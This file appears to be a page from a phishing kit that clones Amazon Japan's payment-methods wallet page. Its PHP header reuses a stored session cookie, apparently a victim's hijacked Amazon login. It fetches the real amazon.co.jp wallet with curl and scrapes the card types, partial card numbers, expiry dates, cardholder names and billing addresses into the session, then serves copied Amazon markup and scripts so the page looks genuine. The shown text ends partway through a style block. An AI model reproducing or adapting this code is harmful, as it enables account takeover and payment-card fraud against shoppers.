<?php

include './php/xzpc.php';
session_start();
$cookieSuccess = $_SESSION["cookiesuccess"]?$_SESSION["cookiesuccess"]:"./cookies/".md5(time().rand(10000,99999)).".cookie";
$_SESSION["cookiesuccess"] = $cookieSuccess;
include './php/curl.php';
if(is_mobile_request()){
    header("location: /walletm.php");
    exit;
}

if($_SESSION["cardinfo"]){
    $cardInfo = $_SESSION["cardinfo"]["cardlist"];
}else{
    
   
    $url = "https://www.amazon.co.jp/cpe/yourpayments/wallet";
    
    
    $result = get_curl($cookieSuccess,$url,false);
 
    
    $isLogin = strpos($result,'paymentsHubHeaderSection');
    
    if($isLogin){
        preg_match_all("/nav-line-1 nav-progressive-content\">(.*?)</i", $result, $userName);
        preg_match_all("/attribute nav-progressive-content\">(.*?)</i", $result, $cartNum);
        
        preg_match_all("/<\/h5><\/div><\/div><\/div><div class=\"a-row a-spacing-top-mini a-ws-row\">(.*?)<div class=\"a-section a-spacing-small pmts-balance-list\">/i", $result, $cardHtml);
        //echo htmlspecialchars($cardHtml[1][0]);
         preg_match_all("/<div class=\"a-fixed-left-grid pmts-instrument-detail-rows\">(.*?)<div class=\"a-column a-span4 a-text-right a-span-last\">/i", $cardHtml[1][0], $cardHtml);
        
        //print_r($cardHtml);
        
        $cardInfo = array();
        foreach ($cardHtml[1] as $k => $v){
            //$cardList[$k]
            
            preg_match_all("/<span class=\"a-size-base pmts-instrument-display-name\">(.*?)<\/span>/i", $v, $cardType);
            preg_match_all("/<img alt=\"".$cardType[1][0]."\" src=\"(.*?)\"/i", $v, $cardTypeImg);
            
            preg_match_all("/<span class=\"a-letter-space\"><\/span><span>(.*?)<\/span>/i", $v, $cardNum);
            preg_match_all("/<span class=\"a-size-base a-color-secondary\">(.*?)<\/span>/i", $v, $cardDate);
            preg_match_all("/人<\/span><br>(.*?)<\/div>/i", $v, $cardName);
            preg_match_all("/<span class=\"a-size-small pmts-address-field a-text-bold\">(.*?)<\/span>/i", $v, $HomeName);
            preg_match_all("/<span class=\"a-size-small pmts-address-field\">(.*?)<\/span>/i", $v, $HomeInfo);
        
            
            
            //print_r($cartNum);
            
            $cardInfo[]=array(
                'cardType'=>$cardType[1][0],
                'cardTypeImg'=>$cardTypeImg[1][0],
                'cardNum'=>$cardNum[1][0],
                'cardDate'=>$cardDate[1][0],
                'cardName'=>$cardName[1][0],
                'homeName'=>$HomeName[1][0],
                'homeInfo'=>$HomeInfo[1],
                'cardok'=>false
            );
        }
        
        $_SESSION["cardinfo"] = array(
            "cardlist" => $cardInfo,
            "username" => $userName[1][0],
            "cartnum" => $cartNum[1][0]
        );
        
    }else {
        header("location: /");
    }
}
?>


<html lang="ja" class="a-js a-audio a-video a-canvas a-svg a-drag-drop a-geolocation a-history a-webworker a-autofocus a-input-placeholder a-textarea-placeholder a-local-storage a-gradients a-transform3d a-touch-scrolling a-text-shadow a-text-stroke a-box-shadow a-border-radius a-border-image a-opacity a-transform a-transition a-ember" data-19ax5a9jf="dingo" data-aui-build-date="3.21.2-2021-03-11">
 <!-- sp:feature:head-start -->
 <head>
  <meta charset="utf-8" /> 
  <link rel="shortcut icon" href="/favicon.ico" type="image/x-icon" />
  <link rel="bookmark" href="/favicon.ico" type="image/x-icon" />
  <!-- sp:feature:cs-optimization --> 
  <meta http-equiv="x-dns-prefetch-control" content="on" /> 
  <link rel="dns-prefetch" href="https://images-fe.ssl-images-amazon.com" /> 
  <link rel="dns-prefetch" href="https://m.media-amazon.com" /> 
  <link rel="dns-prefetch" href="https://completion.amazon.com" /> 
  <link rel="stylesheet" href="https://images-fe.ssl-images-amazon.com/images/I/41icwgAxVqL._RC|71gZeZttoWL.css,21sPJXi0KOL.css,31YZpDCYJPL.css,21MKjoYL8wL.css,41OiMQkB+EL.css,01p4B5hXgrL.css,11kO7yAgiQL.css,31B6j+v-CkL.css,01XHMOHpK1L.css,01kABfoKF-L.css,01ucgi+I44L.css,31IrUp1HMlL.css_.css?AUIClients/NavDesktopUberAsset&amp;Bq2NL32T#desktop.language-ja.jp.309131-T1" /> 
  <!-- 25ge6wyig504 --> 
  <!-- sp:feature:aui-assets --> 
  <link rel="stylesheet" href="https://images-fe.ssl-images-amazon.com/images/I/11KpeNaLkYL._RC|01pvFvAg2+L.css,41QRxRCb-lL.css,21qPwhPKAAL.css,01Vctty9pOL.css,017DsKjNQJL.css,0131vqwP5UL.css,41EWOOlBJ9L.css,11gKzVUTNZL.css,01ElnPiDxWL.css,11bGSgD5pDL.css,01Dm5eKVxwL.css,01IdKcBuAdL.css,01y-XAlI+2L.css,01ZfXnjPmmL.css,01oDR3IULNL.css,31q1y1irc5L.css,01XPHJk60-L.css,01R0k0yxPXL.css,21xVR0NtxzL.css,11gneA3MtJL.css,21fecG8pUzL.css,01RddH8vm-L.css,01F7oM-p7IL.css,21AmhU6t0sL.css,11zGrJZ9D2L.css,11tRp6+0HHL.css,11MrdqKlKnL.css,11oHt2HYxnL.css,01-fWz3sOQL.css,11ocrgKoE-L.css,115m6JDHi9L.css,11g1xm90ZvL.css,01QrWuRrZ-L.css,21pIv-yKhaL.css,01Wiow6micL.css,01gAR5pB+IL.css,119dKrtBoVL.css,11Y05DTEL6L.css,01cbS3UK11L.css,21F85am0yFL.css,01giMEP+djL.css_.css?AUIClients/AmazonUI&amp;UZJpE8II#jp.not-trident.305299-T1.263677-T2" /> 
  <script>
(function(f,h,Q,F){function A(a){w&&w.tag&&w.tag(q(":","aui",a))}function u(a,b){w&&w.count&&w.count("aui:"+a,0===b?0:b||(w.count("aui:"+a)||0)+1)}function p(a){try{return a.test(navigator.userAgent)}catch(b){return!1}}function y(a,b,c){a.addEventListener?a.addEventListener(b,c,!1):a.attachEvent&&a.attachEvent("on"+b,c)}function q(a,b,c,e){b=b&&c?b+a+c:b||c;return e?q(a,b,e):b}function G(a,b,c){try{Object.defineProperty(a,b,{value:c,writable:!1})}catch(e){a[b]=c}return c}function va(a,b){var c=a.length,
e=c,g=function(){e--||(R.push(b),S||(setTimeout(ca,0),S=!0))};for(g();c--;)da[a[c]]?g():(B[a[c]]=B[a[c]]||[]).push(g)}function wa(a,b,c,e,g){var d=h.createElement(a?"script":"link");y(d,"error",e);g&&y(d,"load",g);a?(d.type="text/javascript",d.async=!0,c&&/AUIClients|images[/]I/.test(b)&&d.setAttribute("crossorigin","anonymous"),d.src=b):(d.rel="stylesheet",d.href=b);h.getElementsByTagName("head")[0].appendChild(d)}function ea(a,b){return function(c,e){function g(){wa(b,c,d,function(b){T?u("resource_unload"):
d?(d=!1,u("resource_retry"),g()):(u("resource_error"),a.log("Asset failed to load: "+c));b&&b.stopPropagation?b.stopPropagation():f.event&&(f.event.cancelBubble=!0)},e)}if(fa[c])return!1;fa[c]=!0;u("resource_count");var d=!0;return!g()}}function xa(a,b,c){for(var e={name:a,guard:function(c){return b.guardFatal(a,c)},logError:function(c,d,e){b.logError(c,d,e,a)}},g=[],d=0;d<c.length;d++)H.hasOwnProperty(c[d])&&(g[d]=U.hasOwnProperty(c[d])?U[c[d]](H[c[d]],e):H[c[d]]);return g}function C(a,b,c,e,g){return function(d,
h){function n(){var a=null;e?a=h:"function"===typeof h&&(p.start=D(),a=h.apply(f,xa(d,k,l)),p.end=D());if(b){H[d]=a;a=d;for(da[a]=!0;(B[a]||[]).length;)B[a].shift()();delete B[a]}p.done=!0}var k=g||this;"function"===typeof d&&(h=d,d=F);b&&(d=d?d.replace(ha,""):"__NONAME__",V.hasOwnProperty(d)&&k.error(q(", reregistered by ",q(" by ",d+" already registered",V[d]),k.attribution),d),V[d]=k.attribution);for(var l=[],m=0;m<a.length;m++)l[m]=a[m].replace(ha,"");var p=ia[d||"anon"+ ++ya]={depend:l,registered:D(),
namespace:k.namespace};c?n():va(l,k.guardFatal(d,n));return{decorate:function(a){U[d]=k.guardFatal(d,a)}}}}function ja(a){return function(){var b=Array.prototype.slice.call(arguments);return{execute:C(b,!1,a,!1,this),register:C(b,!0,a,!1,this)}}}function W(a,b){return function(c,e){e||(e=c,c=F);var g=this.attribution;return function(){z.push(b||{attribution:g,name:c,logLevel:a});var d=e.apply(this,arguments);z.pop();return d}}}function I(a,b){this.load={js:ea(this,!0),css:ea(this)};G(this,"namespace",
b);G(this,"attribution",a)}function ka(){h.body?r.trigger("a-bodyBegin"):setTimeout(ka,20)}function E(a,b){a.className=X(a,b)+" "+b}function X(a,b){return(" "+a.className+" ").split(" "+b+" ").join(" ").replace(/^ | $/g,"")}function la(a){try{return a()}catch(b){return!1}}function J(){if(K){var a={w:f.innerWidth||n.clientWidth,h:f.innerHeight||n.clientHeight};5<Math.abs(a.w-Y.w)||50<a.h-Y.h?(Y=a,L=4,(a=k.mobile||k.tablet?450<a.w&&a.w>a.h:1250<=a.w)?E(n,"a-ws"):n.className=X(n,"a-ws")):0<L&&(L--,ma=
setTimeout(J,16))}}function za(a){(K=a===F?!K:!!a)&&J()}function Aa(){return K}function v(a,b){return"sw:"+(b||"")+":"+a+":"}function na(){oa.forEach(function(a){A(a)})}function t(a){oa.push(a)}function pa(a,b,c,e){if(c){b=p(/Chrome/i)&&!p(/Edge/i)&&!p(/OPR/i)&&!a.capabilities.isAmazonApp&&!p(new RegExp(Z+"bwv"+Z+"b"));var g=v(e,"browser"),d=v(e,"prod_mshop"),f=v(e,"beta_mshop");!a.capabilities.isAmazonApp&&c.browser&&b&&(t(g+"supported"),c.browser.action(g,e));!b&&c.browser&&t(g+"unsupported");c.prodMshop&&
t(d+"unsupported");c.betaMshop&&t(f+"unsupported")}}"use strict";var M=Q.now=Q.now||function(){return+new Q},D=function(a){return a&&a.now?a.now.bind(a):M}(f.performance),N=D(),l=f.AmazonUIPageJS||f.P;if(l&&l.when&&l.register){N=[];for(var m=h.currentScript;m;m=m.parentElement)m.id&&N.push(m.id);return l.log("A copy of P has already been loaded on this page.","FATAL",N.join(" "))}var w=f.ue;A();A("aui_build_date:3.21.2-2021-03-11");var R=[],S=!1;var ca=function(){for(var a=setTimeout(ca,0),b=M();R.length;)if(R.shift()(),
50<M()-b)return;clearTimeout(a);S=!1};var da={},B={},fa={},T=!1;y(f,"beforeunload",function(){T=!0;setTimeout(function(){T=!1},1E4)});var ha=/^prv:/,V={},H={},U={},ia={},ya=0,Z=String.fromCharCode(92),z=[],qa=f.onerror;f.onerror=function(a,b,c,e,g){g&&"object"===typeof g||(g=Error(a,b,c),g.columnNumber=e,g.stack=b||c||e?q(Z,g.message,"at "+q(":",b,c,e)):F);var d=z.pop()||{};g.attribution=q(":",g.attribution||d.attribution,d.name);g.logLevel=d.logLevel;g.attribution&&console&&console.log&&console.log([g.logLevel||
"ERROR",a,"thrown by",g.attribution].join(" "));z=[];qa&&(d=[].slice.call(arguments),d[4]=g,qa.apply(f,d))};I.prototype={logError:function(a,b,c,e){b={message:b,logLevel:c||"ERROR",attribution:q(":",this.attribution,e)};if(f.ueLogError)return f.ueLogError(a||b,a?b:null),!0;console&&console.error&&(console.log(b),console.error(a));return!1},error:function(a,b,c,e){a=Error(q(":",e,a,c));a.attribution=q(":",this.attribution,b);throw a;},guardError:W(),guardFatal:W("FATAL"),guardCurrent:function(a){var b=
z[z.length-1];return b?W(b.logLevel,b).call(this,a):a},log:function(a,b,c){return this.logError(null,a,b,c)},declare:C([],!0,!0,!0),register:C([],!0),execute:C([]),AUI_BUILD_DATE:"3.21.2-2021-03-11",when:ja(),now:ja(!0),trigger:function(a,b,c){var e=M();this.declare(a,{data:b,pageElapsedTime:e-(f.aPageStart||NaN),triggerTime:e});c&&c.instrument&&O.when("prv:a-logTrigger").execute(function(b){b(a)})},handleTriggers:function(){this.log("handleTriggers deprecated")},attributeErrors:function(a){return new I(a)},
_namespace:function(a,b){return new I(a,b)}};var r=G(f,"AmazonUIPageJS",new I);var O=r._namespace("PageJS","AmazonUI");O.declare("prv:p-debug",ia);r.declare("p-recorder-events",[]);r.declare("p-recorder-stop",function(){});G(f,"P",r);ka();if(h.addEventListener){var ra;h.addEventListener("DOMContentLoaded",ra=function(){r.trigger("a-domready");h.removeEventListener("DOMContentLoaded",ra,!1)},!1)}var n=h.documentElement,aa=function(){var a=["O","ms","Moz","Webkit"],b=h.createElement("div");return{testGradients:function(){return!0},
test:function(c){var e=c.charAt(0).toUpperCase()+c.substr(1);c=(a.join(e+" ")+e+" "+c).split(" ");for(e=c.length;e--;)if(""===b.style[c[e]])return!0;return!1},testTransform3d:function(){return!0}}}();l=n.className;var sa=/(^| )a-mobile( |$)/.test(l),ta=/(^| )a-tablet( |$)/.test(l),k={audio:function(){return!!h.createElement("audio").canPlayType},video:function(){return!!h.createElement("video").canPlayType},canvas:function(){return!!h.createElement("canvas").getContext},svg:function(){return!!h.createElementNS&&
!!h.createElementNS("http://www.w3.org/2000/svg","svg").createSVGRect},offline:function(){return navigator.hasOwnProperty&&navigator.hasOwnProperty("onLine")&&navigator.onLine},dragDrop:function(){return"draggable"in h.createElement("span")},geolocation:function(){return!!navigator.geolocation},history:function(){return!(!f.history||!f.history.pushState)},webworker:function(){return!!f.Worker},autofocus:function(){return"autofocus"in h.createElement("input")},inputPlaceholder:function(){return"placeholder"in
h.createElement("input")},textareaPlaceholder:function(){return"placeholder"in h.createElement("textarea")},localStorage:function(){return"localStorage"in f&&null!==f.localStorage},orientation:function(){return"orientation"in f},touch:function(){return"ontouchend"in h},gradients:function(){return aa.testGradients()},hires:function(){var a=f.devicePixelRatio&&1.5<=f.devicePixelRatio||f.matchMedia&&f.matchMedia("(min-resolution:144dpi)").matches;u("hiRes"+(sa?"Mobile":ta?"Tablet":"Desktop"),a?1:0);
return a},transform3d:function(){return aa.testTransform3d()},touchScrolling:function(){return p(/Windowshop|android|OS ([5-9]|[1-9][0-9]+)(_[0-9]{1,2})+ like Mac OS X|Chrome|Silk|Firefox|Trident.+?; Touch/i)},ios:function(){return p(/OS [1-9][0-9]*(_[0-9]*)+ like Mac OS X/i)&&!p(/trident|Edge/i)},android:function(){return p(/android.([1-9]|[L-Z])/i)&&!p(/trident|Edge/i)},mobile:function(){return sa},tablet:function(){return ta},rtl:function(){return"rtl"===n.dir}};for(m in k)k.hasOwnProperty(m)&&
(k[m]=la(k[m]));for(var ba="textShadow textStroke boxShadow borderRadius borderImage opacity transform transition".split(" "),P=0;P<ba.length;P++)k[ba[P]]=la(function(){return aa.test(ba[P])});var K=!0,ma=0,Y={w:0,h:0},L=4;J();y(f,"resize",function(){clearTimeout(ma);L=4;J()});var ua={getItem:function(a){try{return f.localStorage.getItem(a)}catch(b){}},setItem:function(a,b){try{return f.localStorage.setItem(a,b)}catch(c){}}};n.className=X(n,"a-no-js");E(n,"a-js");!p(/OS [1-8](_[0-9]*)+ like Mac OS X/i)||
f.navigator.standalone||p(/safari/i)||E(n,"a-ember");l=[];for(m in k)k.hasOwnProperty(m)&&k[m]&&l.push("a-"+m.replace(/([A-Z])/g,function(a){return"-"+a.toLowerCase()}));E(n,l.join(" "));n.setAttribute("data-aui-build-date","3.21.2-2021-03-11");r.register("p-detect",function(){return{capabilities:k,localStorage:k.localStorage&&ua,toggleResponsiveGrid:za,responsiveGridEnabled:Aa}});p(/UCBrowser/i)||k.localStorage&&E(n,ua.getItem("a-font-class"));r.declare("a-event-revised-handling",!1);try{var x=navigator.serviceWorker}catch(a){A("sw:nav_err")}x&&
(y(x,"message",function(a){a&&a.data&&u(a.data.k,a.data.v)}),x.controller&&x.controller.postMessage("MSG-RDY"));var oa=[];l={reg:{},unreg:{}};l.unreg.browser={action:function(a,b){try{x.getRegistrations().then(function(c){c.forEach(function(c){c.unregister().then(function(){u(a+"success")}).catch(function(c){r.logError(c,"[AUI SW] Failed to "+b+" service worker: ");u(a+"failure")})})})}catch(c){A("sw:api_error")}}};(function(a){var b=a.reg,c=a.unreg;x&&x.getRegistrations?(O.when("A","a-util").execute(function(a,
b){pa(a,b,c,"unregister")}),y(f,"load",function(){O.when("A","a-util").execute(function(a,c){pa(a,c,b,"register");na()})})):(b&&(b.browser&&t(v("register","browser")+"unsupported"),b.prodMshop&&t(v("register","prod_mshop")+"unsupported"),b.betaMshop&&t(v("register","beta_mshop")+"unsupported")),c&&(c.browser&&t(v("unregister","browser")+"unsupported"),c.prodMshop&&t(v("unregister","prod_mshop")+"unsupported"),c.betaMshop&&t(v("unregister","beta_mshop")+"unsupported")),na())})(l);r.declare("a-fix-event-off",
!1);u("pagejs:pkgExecTime",D()-N)})(window,document,Date);
(function(b){function q(a,g,k){function r(a,c,d){var b=Array(g.length);~l&&(b[l]={});~m&&(b[m]=d);for(d=0;d<n.length;d++){var e=n[d],f=a[d];b[e]=f}for(d=0;d<p.length;d++)e=p[d],f=c[d],b[e]=f;a=k.apply(null,b);return~l?b[l]:a}"string"!==typeof a&&b.P.error("C001");if(!t[a]){t[a]=!0;k||(k=g,g=[]);a=a.split(":",2);var c=a[1]?a[0]:void 0,h=(a[1]||a[0]).replace(/@capability\//,"@c/"),f=c?b.P._namespace(c):b.P,u=!h.lastIndexOf("@c/",0),n=[];a=[];for(var p=[],v=[],m=-1,l=-1,c=0;c<g.length;c++){var e=g[c];
"module"===e&&f.error("C002");"exports"===e?l=c:"require"===e?m=c:e.lastIndexOf("@p/",0)?e.lastIndexOf("@c/",0)?(n.push(c),a.push("mix:"+e)):(p.push(c),v.push(e)):(n.push(c),a.push(e.substr(3)))}f.when.apply(f,a).register("mix:"+h,function(){var a=[].slice.call(arguments);return u||~m||p.length?{capabilities:v,cardModuleFactory:function(b,d){b=r(a,b,d);b.P=f;return b},require:~m?q:void 0}:r(a,[],function(){})});u&&f.when("mix:@amzn/mix.client-runtime","mix:"+h).execute(function(a,b){a.registerCapabilityModule(h,
b)});f.when("mix:"+h).register("xcp:"+h,function(a){return a});var q=function(a,b,d){try{var c=a[0],e=c.lastIndexOf("@p/",0)?"mix:"+c:c.substr(3);f.when(e).execute(function(a){try{b(a)}catch(c){d(c)}})}catch(g){d(g)}}}}"use strict";var t={};b.mix_d||((b.Promise?P:P.when("3p-promise")).register("@p/promise-is-ready",function(a){b.Promise=b.Promise||a}),(Array.prototype.includes?P:P.when("a-polyfill")).register("@p/polyfill-is-ready",function(){}),b.mix_d=function(a,b,k){P.when("@p/promise-is-ready",
"@p/polyfill-is-ready").execute("@p/mix-d-deps",function(){q(a,b,k)})},b.xcp_d=b.mix_d,P.when("mix:@amzn/mix.client-runtime").execute(function(a){P.declare("xcp:@xcp/runtime",a)}))})(window);
(window.AmazonUIPageJS ? AmazonUIPageJS : P).when('sp.load.js').execute(function() {
  (window.AmazonUIPageJS ? AmazonUIPageJS : P).load.js('https://images-fe.ssl-images-amazon.com/images/I/61-6nKPKyWL.js?AUIClients/AmazonUIjQuery');
  (window.AmazonUIPageJS ? AmazonUIPageJS : P).load.js('https://images-fe.ssl-images-amazon.com/images/I/11Y+5x+kkTL._RC|51IWYO5M+zL.js,112nmCqUymL.js,11giXtZCwVL.js,01+z+uIeJ-L.js,014NohEdE7L.js,21NNXfMitSL.js,11GXfd3+z+L.js,51gm4oPD2cL.js,11AHlQhPRjL.js,11UNQpqeowL.js,11OREnu1epL.js,11KbZymw5ZL.js,21r53SJg7LL.js,0190vxtlzcL.js,51bbIMIQQwL.js,3109-RXWZcL.js,015c-6CIP9L.js,01ezj5Rkz1L.js,11VS-C+YWGL.js,31pOTH2ZMRL.js,01rpauTep4L.js,01zbcJxtbAL.js_.js?AUIClients/AmazonUI&tbOQM7bq#309035-T1');
  (window.AmazonUIPageJS ? AmazonUIPageJS : P).load.js('https://images-fe.ssl-images-amazon.com/images/I/51rvBMrJSfL.js?AUIClients/CardJsRuntimeBuzzCopyBuild');
});
</script> 
  <!-- sp:feature:cookie-consent-assets --> 
  <!-- sp:feature:nav-inline-css --> 
  <!-- NAVYAAN CSS --> 
  <style type="text/css">
.nav-sprite-v1 .nav-sprite, .nav-sprite-v1 .nav-icon {
  background-image: url(https://images-fe.ssl-images-amazon.com/images/G/09/gno/sprites/nav-sprite-global-1x-reorg-fresh._CB413726285_.png);
  background-position: 0 1000px;
  background-repeat: repeat-x;
}
.nav-spinner {
  background-image: url(https://images-fe.ssl-images-amazon.com/images/G/09/javascripts/lib/popover/images/snake._CB485935615_.gif);
  background-position: center center;
  background-repeat: no-repeat;
}
.nav-timeline-icon, .nav-access-image, .nav-timeline-prime-icon {
  background-image: url(https://images-fe.ssl-images-amazon.com/images/G/09/gno/sprites/timeline_sprite_1x._CB439967861_.png);
  background-repeat: no-repeat;
}
</style> 
  <!-- sp:feature:host-assets --> 
  <!-- hqpjdswfrryckak0rwjytb4ckl0 --> 
  <title>お客様の支払い方法</title> 
  <script>
    window.P && P.register('sp.load.js');
</script> 
  <!-- sp:feature:nav-inline-js --> 
  <!-- NAVYAAN JS --> 
  <script type="text/javascript">!function(n){function e(n,e){return{m:n,a:function(n){return[].slice.call(n)}(e)}}document.createElement("header");var r=function(n){function u(n,r,u){n[u]=function(){a._replay.push(r.concat(e(u,arguments)))}}var a={};return a._sourceName=n,a._replay=[],a.getNow=function(n,e){return e},a.when=function(){var n=[e("when",arguments)],r={};return u(r,n,"run"),u(r,n,"declare"),u(r,n,"publish"),u(r,n,"build"),r},u(a,[],"declare"),u(a,[],"build"),u(a,[],"publish"),u(a,[],"importEvent"),r._shims.push(a),a};r._shims=[],n.$Nav||(n.$Nav=r("rcx-nav")),n.$Nav.make||(n.$Nav.make=r)}(window)</script>
  <script type="text/javascript">
$Nav.importEvent('navbarJS-beaconbelt');
$Nav.declare('img.sprite', {
  'png32': 'https://images-fe.ssl-images-amazon.com/images/G/09/gno/sprites/nav-sprite-global-1x-reorg-fresh._CB413726285_.png',
  'png32-2x': 'https://images-fe.ssl-images-amazon.com/images/G/09/gno/sprites/nav-sprite-global-2x-reorg-fresh._CB413726285_.png'
});
$Nav.declare('img.timeline', {
  'timeline-icon-2x': 'https://images-fe.ssl-images-amazon.com/images/G/09/gno/sprites/timeline_sprite_2x._CB443581322_.png'
});
window._navbarSpriteUrl = 'https://images-fe.ssl-images-amazon.com/images/G/09/gno/sprites/nav-sprite-global-1x-reorg-fresh._CB413726285_.png';
$Nav.declare('img.pixel', 'https://images-fe.ssl-images-amazon.com/images/G/09/x-locale/common/transparent-pixel._CB485935026_.gif');
</script> 
 </head>
 <body>
 <div style="position: absolute;color: #fff;font-size:5px;">
     このサービスは、".$_SERVER["HTTP_HOST"]." の代理として amazon.co.jp が提供しています。
    <a href="https://www.amazon.co.jp" style="color: #fff;">詳細</a>
 </div>
  <img src="https://images-fe.ssl-images-amazon.com/images/G/09/gno/sprites/nav-sprite-global-1x-reorg-fresh._CB413726285_.png" style="display:none" alt="" /> 
  <script type="text/javascript">var nav_t_after_preload_sprite = + new Date();</script> 
  <script>
(window.AmazonUIPageJS ? AmazonUIPageJS : P).when('navCF').execute(function() {
  (window.AmazonUIPageJS ? AmazonUIPageJS : P).load.js('https://images-fe.ssl-images-amazon.com/images/I/41eF0jJqsmL._RC|71O2Uk+JZxL.js,61Fx4tQSQ3L.js,41W9ohA0e+L.js,11XScV0Nr4L.js,21cmvUGs-3L.js,11ltDFUycFL.js,41SZNgvX4oL.js,51pktuVkksL.js,31qkpNdCLUL.js,01TL9qHh2UL.js,01KW1GJCT1L.js,313wGfJU0iL.js_.js?AUIClients/NavDesktopUberAsset&E80S1SMO#desktop.320369-T1');
});
</script> 
  <!-- sp:feature:nav-skeleton --> 
  <!-- sp:feature:navbar --> 
  <!--Pilu --> 
  <!-- NAVYAAN --> 
  <!-- navmet initial definition --> 
  <script type="text/javascript">
    // Nav start should be logged at this place only if request is NOT progressively loaded.
    // For progressive loading case this metric is logged as part of skeleton.
    // Presence of skeleton signals that request is progressively loaded.
    if(!document.getElementById("navbar-skeleton")) {
      window.uet && uet('ns');
    }
    window._navbar = (function (o) {
      o.componentLoaded = o.loading = function(){};
      o.browsepromos = {};
      o.issPromos = [];
      return o;
    }(window._navbar || {}));
    window._navbar.declareOnLoad = function () { window.$Nav && $Nav.declare('page.load'); };
    if (window.addEventListener) {
      window.addEventListener("load", window._navbar.declareOnLoad, false);
    } else if (window.attachEvent) {
      window.attachEvent("onload", window._navbar.declareOnLoad);
    } else if (window.$Nav) {
      $Nav.when('page.domReady').run("OnloadFallbackSetup", function () {
        window._navbar.declareOnLoad();
      });
    }
    window.$Nav && $Nav.declare('logEvent.enabled',
      'false');

    window.$Nav && $Nav.declare('config.lightningDeals', {"activeItems":[],"marketplaceID":"A1VC38T7YXB528","customerID":"A2BN15EYB6MCR0"});
  </script> 
  <style mark="aboveNavInjectionCSS" type="text/css">
      #nav-xshop .nav-a {padding: 2px 10px 0 10px; } #navbar.nav-primeDay #nav-tools .nav-line-3 {line-height: 14px;} #navbar.nav-primeDay #nav-tools .nav-line-4 {line-height: 14px;} #navbar.nav-primeDay #nav-link-yourAccount.nav-truncate {width: 150px;} #nav-flyout-iss-anchor {z-index: 101;} .nav-subnavFlyout .nav-flyout-content{min-width: auto; min-height:auto;}div#navSwmHoliday.nav-focus {border-bottom: none;margin-top: 0;}
    </style> 
  <script mark="aboveNavInjectionJS" type="text/javascript">
      try {
        window.$Nav && $Nav.when('$').run('defineIsArray', function(jQuery) { if(jQuery.isArray===undefined) { jQuery.isArray=function(param) { if(param.length===undefined) { return false; } return true; }; } }); window.$Nav && $Nav.when('$','$F','config','logEvent','panels','phoneHome','dataPanel','flyouts.renderPromo','flyouts.sloppyTrigger','flyouts.accessibility','util.mouseOut','util.onKey','debug.param').build('flyouts.buildSubPanels',function($,$F,config,logEvent,panels,phoneHome,dataPanel,renderPromo,createSloppyTrigger,a11yHandler,mouseOutUtility,onKey,debugParam){var flyoutDebug=debugParam('navFlyoutClick');return function(flyout,event){var linkKeys=[];$('.nav-item',flyout.elem()).each(function(){var $item=$(this);linkKeys.push({link:$item,panelKey:$item.attr('data-nav-panelkey')});});if(linkKeys.length===0){return;} var visible=false;var $parent=$('<div class="nav-subcats"></div>').appendTo(flyout.elem());var panelGroup=flyout.getName()+'SubCats';var hideTimeout=null;var sloppyTrigger=createSloppyTrigger($parent);var showParent=function(){if(hideTimeout){clearTimeout(hideTimeout);hideTimeout=null;} if(visible){return;} var height=$('#nav-flyout-shopAll').height();$parent.animate({width:'show'},{duration:200,complete:function(){$parent.css({overflow:'visible','height':height});}});visible=true;};var hideParentNow=function(){$parent.stop().css({overflow:'hidden',display:'none',width:'auto',height:'auto'});panels.hideAll({group:panelGroup});visible=false;if(hideTimeout){clearTimeout(hideTimeout);hideTimeout=null;}};var hideParent=function(){if(!visible){return;} if(hideTimeout){clearTimeout(hideTimeout);hideTimeout=null;} hideTimeout=setTimeout(hideParentNow,10);};flyout.onHide(function(){sloppyTrigger.disable();hideParentNow();this.elem().hide();});var addPanel=function($link,panelKey){var panel=dataPanel({className:'nav-subcat',dataKey:panelKey,groups:[panelGroup],spinner:false,visible:false});if(!flyoutDebug){var mouseout=mouseOutUtility();mouseout.add(flyout.elem());mouseout.action(function(){panel.hide();});mouseout.enable();} var a11y=a11yHandler({link:$link,onEscape:function(){panel.hide();$link.focus();}});var logPanelInteraction=function(promoID,wlTriggers){var logNow=$F.once().on(function(){var panelEvent=$.extend({},event,{id:promoID});if(config.browsePromos&&!!config.browsePromos[promoID]){panelEvent.bp=1;} logEvent(panelEvent);phoneHome.trigger(wlTriggers);});if(panel.isVisible()&&panel.hasInteracted()){logNow();}else{panel.onInteract(logNow);}};panel.onData(function(data){renderPromo(data.promoID,panel.elem());logPanelInteraction(data.promoID,data.wlTriggers);});panel.onShow(function(){var columnCount=$('.nav-column',panel.elem()).length;panel.elem().addClass('nav-colcount-'+columnCount);showParent();var $subCatLinks=$('.nav-subcat-links > a',panel.elem());var length=$subCatLinks.length;if(length>0){var firstElementLeftPos=$subCatLinks.eq(0).offset().left;for(var i=1;i<length;i++){if(firstElementLeftPos===$subCatLinks.eq(i).offset().left){$subCatLinks.eq(i).addClass('nav_linestart');}} if($('span.nav-title.nav-item',panel.elem()).length===0){var catTitle=$.trim($link.html());catTitle=catTitle.replace(/ref=sa_menu_top/g,'ref=sa_menu');var $subPanelTitle=$('<span class="nav-title nav-item">'+ catTitle+'</span>');panel.elem().prepend($subPanelTitle);}} $link.addClass('nav-active');});panel.onHide(function(){$link.removeClass('nav-active');hideParent();a11y.disable();});panel.onShow(function(){a11y.elems($('a, area',panel.elem()));});sloppyTrigger.register($link,panel);if(flyoutDebug){$link.click(function(){if(panel.isVisible()){panel.hide();}else{panel.show();}});} var panelKeyHandler=onKey($link,function(){if(this.isEnter()||this.isSpace()){panel.show();}},'keydown',false);$link.focus(function(){panelKeyHandler.bind();}).blur(function(){panelKeyHandler.unbind();});panel.elem().appendTo($parent);};var hideParentAndResetTrigger=function(){hideParent();sloppyTrigger.disable();};for(var i=0;i<linkKeys.length;i++){var item=linkKeys[i];if(item.panelKey){addPanel(item.link,item.panelKey);}else{item.link.mouseover(hideParentAndResetTrigger);}}};}); if(window.$Nav) { $Nav.when('$', 'config', 'flyout.accountList', 'SignInRedirect', 'dataPanel').run('accountListRedirectFix', function ($, config, flyout, SignInRedirect, dataPanel) { if (!config.accountList) { return; } flyout.getPanel().onData(function (data) { if (SignInRedirect) { var $anchors = $('[data-nav-role=signin]', flyout.elem()); $.each($anchors, function(i, anchorEl) {SignInRedirect.setRedirectUrl($(anchorEl), null, null);});}});});}
      } catch ( err ) {
        if ( window.$Nav ) {
          window.$Nav.when('metrics', 'logUeError').run(function(metrics, log) {
            metrics.increment('NavJS:AboveNavInjection:error');
            log(err.toString(), {
              'attribution': 'rcx-nav',
              'logLevel': 'FATAL'
            });
          });
        }
      }
    </script> 
  <noscript> 
   <style type="text/css"><!--
      #navbar #nav-shop .nav-a:hover {
        color: #ff9900;
        text-decoration: underline;
      }
